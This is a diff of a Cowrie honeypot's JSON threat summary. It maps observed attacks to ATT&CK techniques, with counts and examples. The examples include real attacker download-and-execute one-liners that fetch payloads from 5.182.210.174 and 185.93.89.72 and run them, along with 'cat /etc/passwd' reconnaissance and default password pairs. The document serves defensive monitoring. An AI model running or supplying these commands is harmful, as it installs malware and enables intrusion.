@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-08-21 04:02:06",
+  "generated": "2026-08-21 05:02:11",
   "totals": {
-    "commands": 145,
-    "login_failed": 1059,
-    "login_success": 12,
-    "sessions": 900
+    "commands": 192,
+    "login_failed": 1270,
+    "login_success": 18,
+    "sessions": 1052
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 1059,
+      "count": 1270,
       "examples": [
         "odoo / P@ssw0rd",
         "sh\\x00 / /bin/busybox UNSTABLE\\x00",
@@ -21,14 +21,14 @@
         "root / root123."
       ],
       "first": "2026-08-21T00:00:05.590428Z",
-      "last": "2026-08-21T03:58:00.567011Z",
-      "unique_ips": 24
+      "last": "2026-08-21T05:01:26.209925Z",
+      "unique_ips": 29
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 47,
+      "count": 62,
       "examples": [
         "(cd /tmp; wget http://5.182.210.174/ok; curl -O http://5.182.210.174/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/d",
         "(cd /tmp||cd /var/tmp||cd /dev;rm -rf ok ok.1;busybox wget http://5.182.210.174/ok;wget http://5.182.210.174/ok;/userfs/",
@@ -37,14 +37,14 @@
         ">/var/tmp/d && chmod 777 /var/tmp/d && /var/tmp/d && cd /var/tmp/"
       ],
       "first": "2026-08-21T01:04:57.795191Z",
-      "last": "2026-08-21T03:55:18.854459Z",
-      "unique_ips": 4
+      "last": "2026-08-21T04:43:25.261584Z",
+      "unique_ips": 8
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 26,
+      "count": 42,
       "examples": [
         "(cd /tmp; wget http://5.182.210.174/ok; curl -O http://5.182.210.174/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/d",
         "(cd /tmp||cd /var/tmp||cd /dev;rm -rf ok ok.1;busybox wget http://5.182.210.174/ok;wget http://5.182.210.174/ok;/userfs/",
@@ -53,14 +53,14 @@
         "http://185.93.89.72/wget"
       ],
       "first": "2026-08-21T01:04:57.795191Z",
-      "last": "2026-08-21T03:55:18.854459Z",
-      "unique_ips": 5
+      "last": "2026-08-21T04:43:25.261584Z",
+      "unique_ips": 9
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 12,
+      "count": 18,
       "examples": [
         "enable\\x00 / linuxshell\\x00",
         "root / xirtam",
@@ -69,20 +69,21 @@
         "root / root"
       ],
       "first": "2026-08-21T00:25:45.541215Z",
-      "last": "2026-08-21T03:54:37.695225Z",
-      "unique_ips": 12
+      "last": "2026-08-21T04:43:23.995652Z",
+      "unique_ips": 17
     },
     {
       "id": "T1033",
       "name": "System Owner/User Discovery",
       "tactic": "Discovery",
-      "count": 3,
+      "count": 4,
       "examples": [
-        "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w"
+        "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
+        "id"
       ],
       "first": "2026-08-21T01:31:58.535359Z",
-      "last": "2026-08-21T03:54:41.927954Z",
-      "unique_ips": 3
+      "last": "2026-08-21T04:43:24.403972Z",
+      "unique_ips": 4
     },
     {
       "id": "T1059.004",
@@ -110,6 +111,18 @@
       "unique_ips": 1
     },
     {
+      "id": "T1087.001",
+      "name": "Account Discovery: Local Account",
+      "tactic": "Discovery",
+      "count": 1,
+      "examples": [
+        "cat /etc/passwd"
+      ],
+      "first": "2026-08-21T04:43:24.408587Z",
+      "last": "2026-08-21T04:43:24.408587Z",
+      "unique_ips": 1
+    },
+    {
       "id": "T1562.004",
       "name": "Impair Defenses: Disable or Modify System Firewall",
       "tactic": "Defense Evasion",
@@ -129,19 +142,19 @@
     ],
     [
       "system",
-      7
+      10
     ],
     [
       "shell",
-      7
+      10
     ],
     [
       "sh",
-      7
+      10
     ],
     [
       "enable",
-      7
+      10
     ],
     [
       "cd /proc && cat self/cmdline",
@@ -168,6 +181,18 @@
       3
     ],
     [
+      "ping; sh",
+      2
+    ],
+    [
+      "/bin/busybox STC",
+      2
+    ],
+    [
+      "/bin/busybox hostname TOASTER",
+      2
+    ],
+    [
       "/bin/busybox UNSTABLE",
       1
     ],
@@ -189,18 +214,6 @@
     ],
     [
       "/bin/busybox echo > /var/tmp/.fxcat && sh /var/tmp/.fxcat && cd /var/tmp/",
-      1
-    ],
-    [
-      "/bin/busybox echo > /dev/.fxcat && sh /dev/.fxcat && cd /dev/",
-      1
-    ],
-    [
-      "/bin/busybox echo > /dev/shm/.fxcat && sh /dev/shm/.fxcat && cd /dev/shm/",
-      1
-    ],
-    [
-      "/bin/busybox echo > /etc/.fxcat && sh /etc/.fxcat && cd /etc/",
       1
     ]
   ]
